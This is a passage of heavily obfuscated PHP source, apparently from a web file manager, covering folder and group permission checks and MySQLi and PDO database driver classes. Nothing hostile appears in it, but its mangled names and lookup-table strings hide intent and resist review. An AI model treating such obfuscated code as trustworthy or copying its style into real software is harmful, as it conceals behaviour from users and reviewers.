(AuthModel::authCheckRoot($åò­üòæ[$áµ›ñö[408]])) { $”êş· ¬[] = $è¿¾¬ûÙ[$áµ›ñö[1581]]; } } return $”êş· ¬; } private function authFolderOwnerUser($ö›®²ÊÉ) { $Ÿ¤¦ÆŠ‰ =& $_SERVER[¥ÙÌÜ¾ê]; $ô™çŸ† = array(); $úõÖÀö® = !1; foreach ($ö›®²ÊÉ as $Ï‰€èš) { $ùÇ µÆ = $this->authInfo($Ï‰€èš); if ($Ï‰€èš[$Ÿ¤¦ÆŠ‰[498]] == $Ÿ¤¦ÆŠ‰[191]) { $úõÖÀö® = !0; } if ($Ï‰€èš[$Ÿ¤¦ÆŠ‰[406]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($ùÇ µÆ[$Ÿ¤¦ÆŠ‰[408]])) { $ô™çŸ†[] = $Ï‰€èš[$Ÿ¤¦ÆŠ‰[498]]; } } } return array($Ÿ¤¦ÆŠ‰[588] => $ô™çŸ†, $Ÿ¤¦ÆŠ‰[1952] => $úõÖÀö®); } public function authMake($×¢´¤Ì„, $Ó–©îˆĞ = false) { $–½ªÛÚ =& $_SERVER[¥ÙÌÜ¾ê]; $´¥æµ¤Ï = $this->authArrayCheck($×¢´¤Ì„, $Ó–©îˆĞ); if ($´¥æµ¤Ï[$–½ªÛÚ[1954]]) { $´¥æµ¤Ï[$–½ªÛÚ[1954]] = $this->sourceAuthInfo($´¥æµ¤Ï[$–½ªÛÚ[1954]]); } return $´¥æµ¤Ï; } public function authArrayCheck($˜ü±ŸËû, $È£×¹Èç = false) { $‰°ïäç =& $_SERVER[¥ÙÌÜ¾ê]; if (!$˜ü±ŸËû) { return array($‰°ïäç[409] => 0, $‰°ïäç[460] => !1); } $È£×¹Èç = $È£×¹Èç ? $È£×¹Èç : USER_ID; $ğøß‰şÛ = 0; $¾«‹ø¸ = 0; $¼İ€ş§¾ = 0; $½±‘“Â = 0; $ó‰¼§ñÒ = 0; $±²¹í²Õ = 0; $•³áÛË = 1000; $Óª¡Ú¯ = 0; $æºĞäÎ· = 0; $áŠÎğŒ‰ = 0; $‹Í¨¤Ìª = 0; $Ñ¾áş‡ã = array($‰°ïäç[397] => 0); foreach ($˜ü±ŸËû as $Ñ¾áş‡ã) { $ü¢Ş‡ºÕ = $this->authInfo($Ñ¾áş‡ã); if (!$ü¢Ş‡ºÕ) { continue; } $‰Û˜õ« = $Ñ¾áş‡ã[$‰°ïäç[498]]; $ÄÏ¶ñ·Æ = intval($ü¢Ş‡ºÕ[$‰°ïäç[408]]); if ($Ñ¾áş‡ã[$‰°ïäç[406]] == SourceModel::TYPE_USER && $‰Û˜õ« == $È£×¹Èç) { $ğøß‰şÛ = !0; $¼İ€ş§¾ = $ü¢Ş‡ºÕ; $¾«‹ø¸ = $ÄÏ¶ñ·Æ; } else { if ($Ñ¾áş‡ã[$‰°ïäç[406]] == SourceModel::TYPE_GROUP && $this->groupContainUser($‰Û˜õ«, $È£×¹Èç)) { $½±‘“Â = !0; $îı¨ÌÅ = $this->groupStepToUserGroup($‰Û˜õ«, $È£×¹Èç); if ($îı¨ÌÅ < $•³áÛË) { $•³áÛË = $îı¨ÌÅ; $ó‰¼§ñÒ = $ÄÏ¶ñ·Æ; $±²¹í²Õ = $ü¢Ş‡ºÕ; $Óª¡Ú¯ = $‰Û˜õ«; } if ($îı¨ÌÅ == $•³áÛË && $ÄÏ¶ñ·Æ >= $ó‰¼§ñÒ) { $ó‰¼§ñÒ = $ÄÏ¶ñ·Æ; $±²¹í²Õ = $ü¢Ş‡ºÕ; $Óª¡Ú¯ = $‰Û˜õ«; } } else { if ($‰Û˜õ« == $‰°ïäç[191]) { $æºĞäÎ· = !0; $‹Í¨¤Ìª = $ü¢Ş‡ºÕ; $áŠÎğŒ‰ = $ÄÏ¶ñ·Æ; } } } } if ($ğøß‰şÛ) { $ëÖß¢å = $¾«‹ø¸; $ü¢Ş‡ºÕ = $¼İ€ş§¾; $ÖµÓæÊ = LNG($‰°ïäç[1955]); } else { if ($½±‘“Â) { $ëÖß¢å = $ó‰¼§ñÒ; $ü¢Ş‡ºÕ = $±²¹í²Õ; $ñ†–ã´Ó = Model($‰°ïäç[516])->getInfo($Óª¡Ú¯); $ÖµÓæÊ = $‰°ïäç[160] . $ñ†–ã´Ó[$‰°ïäç[520]] . $‰°ïäç[1956] . LNG($‰°ïäç[1957]); } else { if ($æºĞäÎ·) { $ëÖß¢å = $áŠÎğŒ‰; $ü¢Ş‡ºÕ = $‹Í¨¤Ìª; $ÖµÓæÊ = LNG($‰°ïäç[1928]); } else { $ëÖß¢å = 0; $ü¢Ş‡ºÕ = !1; $ÖµÓæÊ = $‰°ïäç[33]; } } } $ê¤ÍÀ¼Ô = array($‰°ïäç[1947] => intval($ëÖß¢å), $‰°ïäç[1931] => $ü¢Ş‡ºÕ, $‰°ïäç[1948] => $ÖµÓæÊ, $‰°ïäç[1940] => $Ñ¾áş‡ã[$‰°ïäç[397]]); return $ê¤ÍÀ¼Ô; } private function groupContainUser($†Ğ›úà, $–—ì£´Û = false) { return in_array($†Ğ›úà, $this->userGroupParents($–—ì£´Û)); } private function groupStepToUserGroup($‹šøŠÙ, $Ø²ôŒòî = false) { $ã¶ÛÁÅ =& $_SERVER[¥ÙÌÜ¾ê]; $½øÂƒû = $this->userGroupList($Ø²ôŒòî); $§ø† = 1000; $ĞÊ–ê‚ = $GLOBALS[$ã¶ÛÁÅ[6]][$ã¶ÛÁÅ[88]][$ã¶ÛÁÅ[1849]] == 1; $¨âÔöù˜ = $ĞÊ–ê‚ ? 3 : 2; foreach ($½øÂƒû as $˜ë©ıŒ‡) { if ($˜ë©ıŒ‡[$ã¶ÛÁÅ[1749]] == $‹šøŠÙ) { return 0; } $û¸«¼ÚÒ = explode($ã¶ÛÁÅ[47], trim($˜ë©ıŒ‡[$ã¶ÛÁÅ[515]], $ã¶ÛÁÅ[47])); if ($û¸«¼ÚÒ[0] == $ã¶ÛÁÅ[191] && count($û¸«¼ÚÒ) > $¨âÔöù˜) { $‘ú¥ÉÌü = array_reverse(array_slice($û¸«¼ÚÒ, $¨âÔöù˜)); $§ê©×öÆ = array_search($‹šøŠÙ, $‘ú¥ÉÌü); if ($§ê©×öÆ !== !1 && $§ê©×öÆ + 1 <= $§ø†) { $§ø† = $§ê©×öÆ + 1; } } } return $§ø†; } private function userGroupList($Ÿ†Â·”¶ = false) { $¹ı™±ê† =& $_SERVER[¥ÙÌÜ¾ê]; static $ÕÜ°»®‘ = array(); if (isset($ÕÜ°»®‘[$Ÿ†Â·”¶])) { return $ÕÜ°»®‘[$Ÿ†Â·”¶]; } $çÆç„ºŸ = Model($¹ı™±ê†[532])->getInfo($Ÿ†Â·”¶); $ÕÜ°»®‘[$Ÿ†Â·”¶] = array_to_keyvalue($çÆç„ºŸ[$¹ı™±ê†[1929]], $¹ı™±ê†[1749]); return $ÕÜ°»®‘[$Ÿ†Â·”¶]; } public function userGroupParents($›àåßÆ¤) { $ıâˆÇü =& $_SERVER[¥ÙÌÜ¾ê]; static $‹•×ıè° = array(); $›àåßÆ¤ = $›àåßÆ¤ ? $›àåßÆ¤ : USER_ID; if (isset($‹•×ıè°[$›àåßÆ¤])) { return $‹•×ıè°[$›àåßÆ¤]; } $÷”åŒ¼ = $this->userGroupList($›àåßÆ¤); $ƒô‘·¥Ø = array(); $É«Ñ¸óÁ = $GLOBALS[$ıâˆÇü[6]][$ıâˆÇü[88]][$ıâˆÇü[1849]] == 1; $ğê›¤ÒŸ = $É«Ñ¸óÁ ? 3 : 2; foreach ($÷”åŒ¼ as $ªõºí™ú) { $³îîú— = array($ªõºí™ú[$ıâˆÇü[1749]]); $áÆóª÷ = explode($ıâˆÇü[47], trim($ªõºí™ú[$ıâˆÇü[515]], $ıâˆÇü[47])); if ($áÆóª÷[0] == $ıâˆÇü[191] && count($áÆóª÷) > $ğê›¤ÒŸ) { $±ë¥Ä³¹ = array_slice($áÆóª÷, $ğê›¤ÒŸ); $³îîú— = array_merge($³îîú—, array_reverse($±ë¥Ä³¹)); } $ƒô‘·¥Ø = array_merge($ƒô‘·¥Ø, $³îîú—); } $‹•×ıè°[$›àåßÆ¤] = array_unique($ƒô‘·¥Ø); return $‹•×ıè°[$›àåßÆ¤]; } public function authTargetInfoMake($“¨ØÏ˜) { $¬Ïô£ıï =& $_SERVER[¥ÙÌÜ¾ê]; $â»×“ñÑ = array(); $şÊĞ©åé = array(); foreach ($“¨ØÏ˜ as $”ØÏ¡æ–) { if ($”ØÏ¡æ–[$¬Ïô£ıï[406]] == SourceModel::TYPE_USER) { $â»×“ñÑ[] = intval($”ØÏ¡æ–[$¬Ïô£ıï[498]]); } else { if ($”ØÏ¡æ–[$¬Ïô£ıï[406]] == SourceModel::TYPE_GROUP) { $şÊĞ©åé[] = intval($”ØÏ¡æ–[$¬Ïô£ıï[498]]); } } } if ($â»×“ñÑ) { $â»×“ñÑ = Model($¬Ïô£ıï[507])->userListInfo($â»×“ñÑ); } if ($şÊĞ©åé) { $ÆõÀ¶Ê¹ = array($¬Ïô£ıï[1836] => array($¬Ïô£ıï[413], $şÊĞ©åé)); $şÊĞ©åé = Model($¬Ïô£ıï[516])->field($¬Ïô£ıï[1958])->where($ÆõÀ¶Ê¹)->select(); $şÊĞ©åé = array_to_keyvalue($şÊĞ©åé, $¬Ïô£ıï[1749]); } return array($¬Ïô£ıï[1959] => $â»×“ñÑ, $¬Ïô£ıï[1960] => $şÊĞ©åé); } public function authInfo($Ğô»¹ö“) { $áœ¶ßÁç =& $_SERVER[¥ÙÌÜ¾ê]; if ($Ğô»¹ö“[$áœ¶ßÁç[1852]]) { $úïª÷¿ = Model($áœ¶ßÁç[501])->listData($Ğô»¹ö“[$áœ¶ßÁç[1852]]); if (!$úïª÷¿) { return !1; $áŞ‡À³É = Model($áœ¶ßÁç[501])->listData(); $‹¶Üé…ë = array_filter_by_field($áŞ‡À³É, $áœ¶ßÁç[408], $áœ¶ßÁç[191]); return $‹¶Üé…ë; } $ïŠ¾Ğî¤ = array_field_key($úïª÷¿, array($áœ¶ßÁç[395], $áœ¶ßÁç[28], $áœ¶ßÁç[408], $áœ¶ßÁç[1771], $áœ¶ßÁç[1772])); $ïŠ¾Ğî¤[$áœ¶ßÁç[1961]] = $Ğô»¹ö“; return $ïŠ¾Ğî¤; } else { return array($áœ¶ßÁç[414] => 0, $áœ¶ßÁç[1755] => $Ğô»¹ö“[$áœ¶ßÁç[1906]], $áœ¶ßÁç[415] => $áœ¶ßÁç[33], $áœ¶ßÁç[1771] => $áœ¶ßÁç[1962]); } } } goto CõñÛµ‚¢“; f®‹“Îä˜†: class DbMysqli extends Db { public function __construct($Ù£êğ´ = '') { $±Ù’õóà =& $_SERVER[¥ÙÌÜ¾ê]; if (!extension_loaded($±Ù’õóà[793])) { think_exception(think_lang($±Ù’õóà[10]) . $±Ù’õóà[911]); } if (!empty($Ù£êğ´)) { $this->config = $Ù£êğ´; if (empty($this->config[$±Ù’õóà[13]])) { $this->config[$±Ù’õóà[13]] = $±Ù’õóà[33]; } } } public function connect($÷È§Ëß© = '', $Ñ½—ıœ = 0) { $ÀşæÌü =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->linkID[$Ñ½—ıœ])) { if (empty($÷È§Ëß©)) { $÷È§Ëß© = $this->config; } $this->linkID[$Ñ½—ıœ] = new mysqli($÷È§Ëß©[$ÀşæÌü[885]], $÷È§Ëß©[$ÀşæÌü[887]], $÷È§Ëß©[$ÀşæÌü[888]], $÷È§Ëß©[$ÀşæÌü[17]], $÷È§Ëß©[$ÀşæÌü[886]] ? intval($÷È§Ëß©[$ÀşæÌü[886]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ãŠâÚ£Ê = $this->linkID[$Ñ½—ıœ]->server_version; $this->linkID[$Ñ½—ıœ]->query($ÀşæÌü[889] . think_config($ÀşæÌü[890]) . $ÀşæÌü[55]); if ($ãŠâÚ£Ê > $ÀşæÌü[891]) { $this->linkID[$Ñ½—ıœ]->query($ÀşæÌü[892]); } $this->connected = !0; if (1 != think_config($ÀşæÌü[18])) { unset($this->config); } } return $this->linkID[$Ñ½—ıœ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Ç‚À®ÓŠ) { $ô–ş¨ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ç‚À®ÓŠ; if ($this->queryID) { $this->free(); } think_action_status($ô–ş¨[19], 1); think_status($ô–ş¨[20]); $this->queryID = $this->_linkID->query($Ç‚À®ÓŠ); if ($this->_linkID->more_results()) { while (($—ÖÆØ¨‰ = $this->_linkID->next_result()) != NULL) { $—ÖÆØ¨‰->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($µ·æ¡©Ç) { $­÷Ş¡ŸÇ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $µ·æ¡©Ç; if ($this->queryID) { $this->free(); } think_action_status($­÷Ş¡ŸÇ[21], 1); think_status($­÷Ş¡ŸÇ[20]); $Æóª¶Ì• = $this->_linkID->query($µ·æ¡©Ç); $this->debug(); if (!1 === $Æóª¶Ì•) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ùç²â = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ùç²â) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¥ØóùÎ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¥ØóùÎ) { $this->error(); return !1; } } return !0; } private function getAll() { $«Æ²Å®á = array(); if ($this->numRows > 0) { for ($Ò€ÉæÚı = 0; $Ò€ÉæÚı < $this->numRows; $Ò€ÉæÚı++) { $«Æ²Å®á[$Ò€ÉæÚı] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $«Æ²Å®á; } public function getFields($’¢èÜ›õ) { $ùÒÎÀ®ó =& $_SERVER[¥ÙÌÜ¾ê]; $¶ñŞõÕÍ = $this->query($ùÒÎÀ®ó[896] . $this->parseKey($’¢èÜ›õ)); $ù§©ÇÓ = array(); if ($¶ñŞõÕÍ) { foreach ($¶ñŞõÕÍ as $À­¯Œì => $Ï¯Î¨§ä) { $ù§©ÇÓ[$Ï¯Î¨§ä[$ùÒÎÀ®ó[27]]] = array($ùÒÎÀ®ó[28] => $Ï¯Î¨§ä[$ùÒÎÀ®ó[27]], $ùÒÎÀ®ó[29] => $Ï¯Î¨§ä[$ùÒÎÀ®ó[30]], $ùÒÎÀ®ó[31] => (bool) ($Ï¯Î¨§ä[$ùÒÎÀ®ó[32]] === $ùÒÎÀ®ó[33]), $ùÒÎÀ®ó[34] => $Ï¯Î¨§ä[$ùÒÎÀ®ó[35]], $ùÒÎÀ®ó[36] => strtolower($Ï¯Î¨§ä[$ùÒÎÀ®ó[37]]) == $ùÒÎÀ®ó[38], $ùÒÎÀ®ó[39] => strtolower($Ï¯Î¨§ä[$ùÒÎÀ®ó[40]]) == $ùÒÎÀ®ó[41]); } } return $ù§©ÇÓ; } public function getTables($™ªçíğ = '') { $ş’«äü” =& $_SERVER[¥ÙÌÜ¾ê]; $œ²ßâ´¢ = !empty($™ªçíğ) ? $ş’«äü”[898] . $™ªçíğ . $ş’«äü”[899] : $ş’«äü”[900]; $ ÏŒêí† = $this->query($œ²ßâ´¢); $š¨Ìõ¬ã = array(); if ($ ÏŒêí†) { foreach ($ ÏŒêí† as $ÜÆ€½¹ô => $Øá‹Î†ó) { $š¨Ìõ¬ã[$ÜÆ€½¹ô] = current($Øá‹Î†ó); } } return $š¨Ìõ¬ã; } public function replace($ì…Î¹îç, $®ó‡„¶á = array()) { $—Ê—Ê­ =& $_SERVER[¥ÙÌÜ¾ê]; foreach ($ì…Î¹îç as $ÄÛŠ±Ú => $¿òì‰Ç) { $ş¶®Ò’¥ = $this->parseValue($¿òì‰Ç); if (is_scalar($ş¶®Ò’¥)) { $œ¼õå Í[] = $ş¶®Ò’¥; $àöšÄÍ…[] = $this->parseKey($ÄÛŠ±Ú); } } $ˆ­µíÌå = $—Ê—Ê­[901] . $this->parseTable($®ó‡„¶á[$—Ê—Ê­[277]]) . $—Ê—Ê­[902] . implode($—Ê—Ê­[47], $àöšÄÍ…) . $—Ê—Ê­[903] . implode($—Ê—Ê­[47], $œ¼õå Í) . $—Ê—Ê­[904]; return $this->execute($ˆ­µíÌå); } public function insertAll($ƒêğª»×, $ôõÌ¡˜œ = array(), $ô’Ã¶Õ¤ = false) { $‰»Ö•‰® =& $_SERVER[¥ÙÌÜ¾ê]; if (!is_array($ƒêğª»×[0])) { return !1; } $ã††òê„ = array_keys($ƒêğª»×[0]); $¿°’êôÔ = array(); foreach ($ƒêğª»× as $İ³Ã¦¬½) { $ûûãğµ’ = array(); foreach ($İ³Ã¦¬½ as $´¨×¹’Í => $ıÒ”½Û½) { $ıÒ”½Û½ = $this->parseValue($ıÒ”½Û½); if (is_scalar($ıÒ”½Û½)) { $ûûãğµ’[] = $ıÒ”½Û½; } } $¿°’êôÔ[] = $‰»Ö•‰®[258] . implode($‰»Ö•‰®[47], $ûûãğµ’) . $‰»Ö•‰®[904]; } array_walk($ã††òê„, array($this, $‰»Ö•‰®[905])); $ÊÇû×‡ = $ô’Ã¶Õ¤ ? $‰»Ö•‰®[906] : $‰»Ö•‰®[907]; $İ¼–º©Ä = $ÊÇû×‡ . $‰»Ö•‰®[908] . $this->parseTable($ôõÌ¡˜œ[$‰»Ö•‰®[277]]) . $‰»Ö•‰®[902] . implode($‰»Ö•‰®[47], $ã††òê„) . $‰»Ö•‰®[909] . implode($‰»Ö•‰®[47], $¿°’êôÔ); return $this->execute($İ¼–º©Ä); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¾Œú¸ÉÛ =& $_SERVER[¥ÙÌÜ¾ê]; $this->error = $this->_linkID->errno . $¾Œú¸ÉÛ[4] . $this->_linkID->error; if ($¾Œú¸ÉÛ[33] != $this->queryStr) { $this->error .= LNG($¾Œú¸ÉÛ[45]) . $this->queryStr; } think_trace($this->error, $¾Œú¸ÉÛ[33], $¾Œú¸ÉÛ[46]); return $this->error; } public function escapeString($éáØÛ¦Å) { if ($this->_linkID) { return $this->_linkID->real_escape_string($éáØÛ¦Å); } else { return addslashes($éáØÛ¦Å); } } public function parseKey(&$©©±˜µ¶, $‚Ş£•“ò = true) { $ŒñéÔ½¤ =& $_SERVER[¥ÙÌÜ¾ê]; if ($‚Ş£•“ò) { $©©±˜µ¶ = $this->parseKeyCheck($©©±˜µ¶); } if ($©©±˜µ¶ != $ŒñéÔ½¤[182] && !preg_match($ŒñéÔ½¤[910], $©©±˜µ¶)) { $©©±˜µ¶ = $ŒñéÔ½¤[383] . trim($©©±˜µ¶, $ŒñéÔ½¤[383]) . $ŒñéÔ½¤[383]; } return $©©±˜µ¶; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($œªšÛ’  = '') { $õéãŸ¤ñ =& $_SERVER[¥ÙÌÜ¾ê]; if (!class_exists($õéãŸ¤ñ[912])) { think_exception(think_lang($õéãŸ¤ñ[10]) . $õéãŸ¤ñ[913]); } if (!empty($œªšÛ’ )) { $this->config = $œªšÛ’ ; if (empty($this->config[$õéãŸ¤ñ[13]])) { $this->config[$õéãŸ¤ñ[13]] = array(); } } } public function connect($ñù¶øÍ = '', $¢¨º¿µ¨ = 0) { $’ÃĞ¬ÄŸ =& $_SERVER[¥ÙÌÜ¾ê]; if (!isset($this->linkID[$¢¨º¿µ¨])) { if (empty($ñù¶øÍ)) { $ñù¶øÍ = $this->config; } $„š‚Ô½Ä = !empty($ñù¶øÍ[$’ÃĞ¬ÄŸ[13]][$’ÃĞ¬ÄŸ[14]]) ? $ñù¶øÍ[$’ÃĞ¬ÄŸ[13]][$’ÃĞ¬ÄŸ[14]] : $this->pconnect; if ($„š‚Ô½Ä) { $ñù¶øÍ[$’ÃĞ¬ÄŸ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$¢¨º¿µ¨] = new PDO($ñù¶øÍ[$’ÃĞ¬ÄŸ[914]], $ñù¶øÍ[$’ÃĞ¬ÄŸ[887]], $ñù¶øÍ[$’ÃĞ¬ÄŸ[888]], $ñù¶øÍ[$’ÃĞ¬ÄŸ[13]]); } catch (PDOException $»Í…Óø¾) { think_exception($»Í…Óø¾->getMessage()); } $this->dbType = $this->_getDsnType($ñù¶øÍ[$’ÃĞ¬ÄŸ[914]]); if (in_array($this->dbType, array($’ÃĞ¬ÄŸ[915], $’ÃĞ¬ÄŸ[916], $’ÃĞ¬ÄŸ[917], $’ÃĞ¬ÄŸ[918]))) { think_exception($’ÃĞ¬ÄŸ[919] . $this->dbType . $’ÃĞ¬ÄŸ[920] . $this->dbType . $’ÃĞ¬ÄŸ[921]); } if (!$this->linkID[$¢¨º¿µ¨]) { think_exception($’ÃĞ¬ÄŸ[922]); } try { $this->linkID[$¢¨º¿µ¨]->exec($’ÃĞ¬ÄŸ[923] . think_config($’ÃĞ¬ÄŸ[890])); } catch (Exception $»Í…Óø¾) { } $this->connected = !0; if (1 != think_config($’ÃĞ¬ÄŸ[18])) { unset($this->config); } } return $this->linkID[$¢¨º¿µ¨]; } public function free() { $this->PDOStatement = null; } public function query($ø¢ü¦Ç, $‚¢‚ò®š = array()) { $ŞŒÄª·Í =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ø¢ü¦Ç; if (!empty($‚¢‚ò®š)) { $this->queryStr .= $ŞŒÄª·Í[924] . print_r($‚¢‚ò®š, !0) . $ŞŒÄª·Í[925]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ŞŒÄª·Í[19], 1); think_status($ŞŒÄª·Í[20]); $this->PDOStatement = $this->_linkID->prepare($ø¢ü¦Ç); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ÛàıÑ¥¡ = $this->PDOStatement->execute($‚¢‚ò®š); $this->debug(); if (!1 === $ÛàıÑ¥¡) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($ÄÑ‡·Ö, $ù…ë„¬É = array()) { $ÔÏÂáã =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÄÑ‡·Ö; if (!empty($ù…ë„¬É)) { $this->queryStr .= $ÔÏÂáã[924] . print_r($ù…ë„¬É, !0) . $ÔÏÂáã[925]; } $€ºÊ‘ÌÑ = !1; if ($this->dbType == $ÔÏÂáã[918]) { if (preg_match($ÔÏÂáã[926], $this->queryStr, $¥Ÿ“÷•)) { $this->table = think_config($ÔÏÂáã[927]) . str_ireplace(think_config($ÔÏÂáã[928]), $ÔÏÂáã[376], $¥Ÿ“÷•[2]); $€ºÊ‘ÌÑ = (bool) $this->query($ÔÏÂáã[929] . strtoupper($this->table) . $ÔÏÂáã[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ÔÏÂáã[21], 1); think_status($ÔÏÂáã[20]); $this->PDOStatement = $this->_linkID->prepare($ÄÑ‡·Ö); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $ ˆÅøõ¿ = $this->PDOStatement->execute($ù…ë„¬É); $this->debug(); if (!1 === $ ˆÅøõ¿) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($€ºÊ‘ÌÑ || preg_match($ÔÏÂáã[930], $ÄÑ‡·Ö)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ãĞ¤¨€° = $this->_linkID->commit(); $this->transTimes = 0; if (!$ãĞ¤¨€°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¦†ÛÉ‘í = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¦†ÛÉ‘í) { $this->error(); return !1; } } return !0; } private function getAll() { $ê§²¹¯å = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($ê§²¹¯å); return $ê§²¹¯å; } public function getFields($è² ‘ç) { $¯•ƒÕ×œ =& $_SERVER[¥ÙÌÜ¾ê]; $this->initConnect(!0); if (think_config($¯•ƒÕ×œ[931])) { $Ù‡ó‚»Ú = str_replace($¯•ƒÕ×œ[932], $è² ‘ç, think_config($¯•ƒÕ×œ[931])); } else { switch ($this->dbType) { case $¯•ƒÕ×œ[915]: case $¯•ƒÕ×œ[933]: $Ù‡ó‚»Ú = "\x53\105\x4c\x45\x43\124\40\x20\x20\143\x6f\154\x75\x6d\156\x5f\x6e\141\155\145\40\x61\163\x20\x27\116\x61\155\x65\47\54\x20\40\40\x64\141\x74\141\x5f\x74\x79\160\x65\40\141\x73\x20\47\124\x79\x70\x65\x27\54\40\x20\x20\143\157\x6c\165\x6d\x6e\x5f\x64\x65\146\141\x75\154\164\x20\x61\x73\40\x27\104\145\x66\141\x75\154\164\47\54\x20\x20\40\x69\x73\137\156\x75\x6c\154\141\x62\x6c\145\40\141\x73\x20\x27\116\x75\x6c\x6c\47\xa\11\11\x46\122\117\115\x9\x69\156\146\157\x72\x6d\x61\164\151\157\156\x5f\163\143\x68\x65\x6d\x61\x2e\x74\x61\142\x6c\145\x73\x20\101\x53\x20\x74\12\11\11\x4a\117\x49\x4e\x9\x69\x6e\x66\x6f\x72\155\x61\x74\151\x6f\x6e\x5f\163\143\x68\145\155\x61\56\x63\x6f\154\x75\x6d\x6e\163\40\x41\x53\40\143\12\11\x9\117\x4e\x20\x20\x74\x2e\164\141\142\154\x65\x5f\143\x61\x74\141\x6c\x6f\147\40\x3d\x20\143\56\x74\x61\142\x6c\145\137\x63\141\164\141\x6c\157\x67\xa\11\x9\x41\x4e\104\40\164\x2e\164\141\142\154\x65\137\163\143\x68\x65\155\141\x20\75\x20\x63\56\x74\141\x62\154\145\137\163\143\150\145\x6d\141\xa\11\11\x41\116\104\40\164\x2e\164\141\x62\x6c\145\x5f\156\x61\x6d\x65\x20\x3d\x20\x63\x2e\x74\x61\142\x6c\x65\137\x6e\x61\155\x65\12\11\11\x57\x48\x45\x52\x45\40\40\x20\x74\56\164\141\x62\154\x65\x5f\x6e\141\155\x65\40\75\40\47{$è² ‘ç}\47"; break; case $¯•ƒÕ×œ[934]: $Ù‡ó‚»Ú = $¯•ƒÕ×œ[935] . $è² ‘ç . $¯•ƒÕ×œ[936]; break; case $¯•ƒÕ×œ[916]: case $¯•ƒÕ×œ[918]: $Ù‡ó‚»Ú = $¯•ƒÕ×œ[937] . $¯•ƒÕ×œ[938] . $¯•ƒÕ×œ[939] . strtoupper($è² ‘ç) . $¯•ƒÕ×œ[940] . strtoupper($è² ‘ç) . $¯•ƒÕ×œ[941]; break; case $¯•ƒÕ×œ[942]: $Ù‡ó‚»Ú = $¯•ƒÕ×œ[943] . $è² ‘ç . $¯•ƒÕ×œ[944]; break; case $¯•ƒÕ×œ[917]: break; case $¯•ƒÕ×œ[945]: default: $Ù‡ó‚»Ú = $¯•ƒÕ×œ[946] . ($this->dbType == $¯•ƒÕ×œ[945] ? "\140{$è² ‘ç}\140" : $è² ‘ç); } } $Œê Ääş = $this->query($Ù‡ó‚»Ú); $ÂŠ®˜æÖ = array(); if ($Œê Ääş) { foreach ($Œê Ääş as $ĞËéŠÇ => $¥ğ‘ô°„) { $¥ğ‘ô°„ = array_change_key_case($¥ğ‘ô°„); $¥ğ‘ô°„[$¯•ƒÕ×œ[28]] = isset($¥ğ‘ô°„[$¯•ƒÕ×œ[28]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[28]] : $¯•ƒÕ×œ[376]; $¥ğ‘ô°„[$¯•ƒÕ×œ[29]] = isset($¥ğ‘ô°„[$¯•ƒÕ×œ[29]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[29]] : $¯•ƒÕ×œ[376]; $úÅ‘•ß = isset($¥ğ‘ô°„[$¯•ƒÕ×œ[271]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[271]] : $¥ğ‘ô°„[$¯•ƒÕ×œ[28]]; $ÂŠ®˜æÖ[$úÅ‘•ß] = array($¯•ƒÕ×œ[28] => $úÅ‘•ß, $¯•ƒÕ×œ[29] => $¥ğ‘ô°„[$¯•ƒÕ×œ[29]], $¯•ƒÕ×œ[31] => (bool) (isset($¥ğ‘ô°„[$¯•ƒÕ×œ[103]]) && $¥ğ‘ô°„[$¯•ƒÕ×œ[103]] === $¯•ƒÕ×œ[33] || isset($¥ğ‘ô°„[$¯•ƒÕ×œ[31]]) && $¥ğ‘ô°„[$¯•ƒÕ×œ[31]] === $¯•ƒÕ×œ[33]), $¯•ƒÕ×œ[34] => isset($¥ğ‘ô°„[$¯•ƒÕ×œ[34]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[34]] : (isset($¥ğ‘ô°„[$¯•ƒÕ×œ[53]]) ? $¥ğ‘ô°„[$¯•ƒÕ×œ[53]] : $¯•ƒÕ×œ[376]), $¯•ƒÕ×œ[36] => isset($¥ğ‘ô°„[$¯•ƒÕ×œ[93]]) ? 